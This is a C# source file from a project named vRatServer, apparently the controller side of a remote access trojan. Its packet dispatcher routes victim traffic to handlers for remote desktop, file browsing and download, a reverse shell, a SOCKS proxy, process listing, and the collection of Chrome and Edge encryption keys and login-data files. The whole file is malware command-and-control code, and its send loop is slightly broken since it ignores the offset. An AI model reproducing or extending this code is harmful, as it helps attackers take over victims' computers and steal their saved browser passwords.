﻿using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using vRatServer.Packets;

namespace vRatServer.Classes
{
    class ClientPacket
    {

        byte[] data;
        public Client client;
        public byte[] idp;
        public byte com;
        public int size;
        
        ~ClientPacket()
        {
            
        }

        public ClientPacket(byte[]? idp, byte com, ref byte[] data, int size, Client client)
        {
            this.client = client;
            this.com = (byte)com;
            if (idp != null)
            {
                this.idp = idp;
            }
            this.data = new byte[size];
            this.size = size;
            Array.Copy(data, 0, this.data, 0, size);
            Array.Clear(data, 0, size);



        }
        public void packetHandler()
        {

            HandlePacket(null);
        }
        void HandlePacket(object o)
        {

            switch (com)
            {

                case (byte)globals.PacketType.Rdp:
                    new RdpPacket(client, ref data);
                    break;
                case (byte)globals.PacketType.sysinfo:
                    new sysinfo(data, client, com);
                    break;
                case (byte)globals.PacketType.FileManagerDrive:
                    new FileManagerPacket(client, data, com, idp);
                    break;
                case (byte)globals.PacketType.FileManagerFile:
                    new FileManagerPacket(client, data, com, idp);
                    break;
                case (byte)globals.PacketType.FileManagerFileDownload:
                    new FileManagerPacket(client, data, com, idp);
                    break;
                case (byte)globals.PacketType.ReverseShellText:
                    new ReverseShellPacket(client, data);
                    break;
                case (byte)globals.PacketType.socksdata:
                    new ClientProxy(client, ref data, idp);
                    break;
                case (byte)globals.PacketType.tasklist:
                    new TaskManagerPacket(client, data);
                    break;
                case (byte)globals.PacketType.getondis:
                    new OnDisPacket(client, data);
                    break;
                case (byte)globals.PacketType.chromekey:
                case (byte)globals.PacketType.edgkey:
                case (byte)globals.PacketType.edglogfile:
                case (byte)globals.PacketType.chromelogfile:
                    new PasswordManagerPacket(client, data, com);
                    break;
                case (byte)globals.PacketType.zipdone:
                    if (client.fmf != null) {
                        Program.f1.BeginInvoke((Action)(() =>
                        {
                            client.fmf.refresFileList();
                            MessageBox.Show("Zip done", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }));

                    }
                    break;
                default:
                    break;




            }

            GC.Collect();

        }


        public int sendPacket()
        {
            int offset = 0;
            int remaining = size;
            int sent = 0;
            int r = 0;
            client.SocketM.WaitOne();
            try
            {


                while (remaining > 0)
                {
                    sent = client.client.Send(data);
                    if (sent <= 0) { break; }
                    offset += sent;
                    remaining -= sent;

                }

            }
            catch (Exception e) { r = -1; }
            client.SocketM.ReleaseMutex();
            return r;


        }
    }
}
